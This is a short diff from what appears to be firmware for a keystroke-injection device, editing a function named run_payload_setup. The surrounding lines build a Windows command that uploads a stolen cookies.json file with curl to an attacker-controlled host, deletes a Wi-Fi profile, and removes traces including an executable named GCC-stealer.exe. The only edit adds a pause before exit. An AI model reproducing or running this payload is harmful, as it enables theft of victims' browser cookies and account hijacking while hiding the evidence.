@@ -203,7 +203,7 @@ void run_payload_setup(){
   " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
   /*" & netsh wlan disconnect" \*/
   " & netsh wlan delete profile "+ssid+"" \
-  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & exit";
+  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & pause && exit";
 
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.println("Running payload...");
